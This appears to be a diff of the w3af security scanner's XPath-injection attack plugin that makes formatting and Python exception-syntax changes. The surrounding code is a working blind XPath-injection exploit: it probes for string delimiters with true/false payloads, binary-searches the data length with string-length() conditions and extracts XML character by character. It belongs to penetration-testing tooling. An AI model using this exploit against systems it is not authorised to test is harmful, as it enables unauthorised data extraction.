@@ -44,6 +44,7 @@ class xpath(AttackPlugin):
     :author: Nahuel Sanchez
     :author: Andres Riancho
     """
+
     def __init__(self):
         AttackPlugin.__init__(self)
 
@@ -77,7 +78,7 @@ class xpath(AttackPlugin):
 
         Then the exploit plugin that exploits os_commanding
         (attack.os_commanding) should return ['os_commanding',] in this method.
-        
+
         If there is more than one location the implementation should return
         ['a', 'b', ..., 'n']
         """
@@ -118,7 +119,7 @@ class xpath(AttackPlugin):
         #
         delimiter = self._get_delimiter(vuln, is_error_resp)
         self.STR_DELIM = delimiter
-        
+
         orig_value = vuln.get_mutant().get_token_original_value()
 
         self.TRUE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DELIM,
@@ -135,20 +136,20 @@ class xpath(AttackPlugin):
 
         mutant_false = mutant.copy()
         mutant_false.set_token_value(self.FALSE_COND)
-        
+
         mutant_true = mutant.copy()
         mutant_true.set_token_value(self.TRUE_COND)
 
         try:
             false_resp = self._uri_opener.send_mutant(mutant_false)
             true_resp = self._uri_opener.send_mutant(mutant_true)
-        except BaseFrameworkException, e:
+        except BaseFrameworkException as e:
             return 'Error "%s".' % e
         else:
             if (is_error_resp(false_resp.get_body())
-                and not is_error_resp(true_resp.get_body())):
+                    and not is_error_resp(true_resp.get_body())):
                 return True, is_error_resp
-        
+
         return False, None
 
     def _get_delimiter(self, vuln, is_error_resp):
@@ -163,29 +164,29 @@ class xpath(AttackPlugin):
         false_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum + 1)
         true_dq = '%s" and "%i"="%i' % (orig_value, self.rnum, self.rnum)
         false_dq = '%s" and "%i"="%i' % (orig_value, self.rnum, self.rnum + 1)
-        
+
         to_test = [("'", true_sq, false_sq),
                    ('"', true_dq, false_dq)]
-        
+
         for str_delim, true_xpath, false_xpath in to_test:
             mutant_true = mutant.copy()
             mutant_false = mutant.copy()
-            
+
             mutant_true.set_token_value(true_xpath)
             mutant_false.set_token_value(false_xpath)
-            
+
             try:
                 true_resp = self._uri_opener.send_mutant(mutant_true)
                 false_resp = self._uri_opener.send_mutant(mutant_false)
-            except BaseFrameworkException, e:
+            except BaseFrameworkException as e:
                 om.out.debug('Error "%s"' % e)
             else:
                 if (is_error_resp(false_resp.get_body())
-                    and not is_error_resp(true_resp.get_body())):
+                        and not is_error_resp(true_resp.get_body())):
                     return str_delim
         else:
             msg = 'Failed to identify XPATH injection string delimiter.'
-            raise BaseFrameworkException(msg)                
+            raise BaseFrameworkException(msg)
 
     def _configure_is_error_function(self, vuln, count):
         """
@@ -207,12 +208,12 @@ class xpath(AttackPlugin):
 
             for _ in xrange(count):
                 req_x = self._uri_opener.send_mutant(mutant)
-                diff_ratio += difflib.SequenceMatcher(None, base_res.get_body(),
-                                                      req_x.get_body()).ratio()
+                diff_ratio += difflib.SequenceMatcher(
+                    None, base_res.get_body(), req_x.get_body()).ratio()
 
-        except BaseFrameworkException, e:
+        except BaseFrameworkException as e:
             om.out.debug('Error "%s"' % e)
-        except RuntimeError, rte:
+        except RuntimeError as rte:
             issue = 'https://github.com/andresriancho/w3af/issues/5278'
 
             msg = ('An unhandled exception occurred while trying to setup'
@@ -314,13 +315,13 @@ class XPathReader(Shell):
         """
         try:
             data_len = self._get_data_len()
-        except BaseFrameworkException, e:
+        except BaseFrameworkException as e:
             return 'Error found during data length extraction: "%s"' % e
 
         if data_len is not None:
             try:
                 data = self.get_data(data_len)
-            except BaseFrameworkException, e:
+            except BaseFrameworkException as e:
                 return 'Error found during data extraction: "%s"' % e
             else:
                 return data
@@ -331,25 +332,25 @@ class XPathReader(Shell):
         XML is too long. In the case of an error, None is returned.
         """
         om.out.debug("Finding XML data length (max: %s)" % self.max_data_len)
-        
+
         maxl = self.max_data_len
         minl = 1
-        
+
         while True:
 
             mid = (maxl + minl) / 2
             om.out.debug("MAX:%i, MID:%i, MIN:%i" % (maxl, mid, minl))
-            
+
             if self._verify_data_len_eq(mid):
                 om.out.debug('Response Length FOUND!: %i ' % (mid))
                 return mid
-            
+
             else:
                 if self._verify_data_len_lt(mid):
                     maxl = mid
                 else:
                     minl = mid
-    
+
     def _fill_xpath_and_eval(self, xpath_fmt, str_len):
         """
         Given a xpath_fmt which takes five params:
@@ -358,39 +359,39 @@ class XPathReader(Shell):
             - XML filter
             - XML filter result length to compare agains (@str_len)
             - True condition
-        
+
         Generate the XPATH, send it to the remote server and
         :return: True when the response does NOT contain an XPATH error.
         """
         mutant = self.get_mutant()
         orig_value = mutant.get_token_original_value()
         skip_len = len(orig_value) + len(self.STR_DELIM) + len(' ')
-        
+
         findlen = xpath_fmt % (orig_value, self.STR_DELIM, XML_FILTER,
                                str_len, self.TRUE_COND[skip_len:])
-        
+
         mutant.set_token_value(findlen)
         lresp = self._uri_opener.send_mutant(mutant)
 
-        if not self.is_error_resp(lresp.get_body()): 
+        if not self.is_error_resp(lresp.get_body()):
             return True
-        
-        return False   
-        
+
+        return False
+
     def _verify_data_len_lt(self, str_len):
         """
-        :return: True if the string data length is LESS THAN @str_len 
+        :return: True if the string data length is LESS THAN @str_len
         """
         xpath_fmt = "%s%s and string-length(%s)<%i %s"
         return self._fill_xpath_and_eval(xpath_fmt, str_len)
-    
+
     def _verify_data_len_eq(self, str_len):
         """
-        :return: True if the string data length is @str_len 
+        :return: True if the string data length is @str_len
         """
         xpath_fmt = "%s%s and string-length(%s)=%i %s"
         return self._fill_xpath_and_eval(xpath_fmt, str_len)
-        
+
     def get_data(self, data_len):
         """
         :param data_len: The data length to retrieve
@@ -400,17 +401,17 @@ class XPathReader(Shell):
         clearer.
         """
         data = [None] * data_len
-        
+
         mod_get_char = return_args(self.get_char_in_pos)
         imap_unordered = self.worker_pool.imap_unordered
         len_iter = xrange(data_len)
-        
+
         for (pos,), char in imap_unordered(mod_get_char, len_iter):
             data[pos] = char
-        
+
         clean_data = []
         current = ''
-        
+
         for char in data:
             if char is None:
                 current = current.strip()
@@ -419,9 +420,9 @@ class XPathReader(Shell):
                 current = ''
             else:
                 current += char
-        
+
         return '\n'.join(clean_data)
-    
+
     def get_char_in_pos(self, pos):
         """
         :return: The character for position @pos in the XML.
@@ -487,27 +488,27 @@ class IsErrorResponse(object):
         mutant.set_token_value(mutant.get_token_original_value())
 
         self.base_response = self.url_opener.send_mutant(mutant)
-        
+
     def is_error_response(self, res_body):
         """
         This functions checks which method must be used to check Responses
-    
+
         :return: True if the res_body is ERROR and FALSE if Not
         """
         # FIXME: See FIXME above where I disable the use of difflib.
         if self.use_difflib:
-            
+
             if self.base_response is None:
                 self._configure()
-                
+
             if difflib.SequenceMatcher(None, self.base_response.get_body(),
                                        res_body).ratio() > THRESHOLD:
                 return True
             else:
                 return False
-    
+
         else:
-    
+
             if re.search(ERROR_MSG, res_body, re.IGNORECASE):
                 return True
             else:
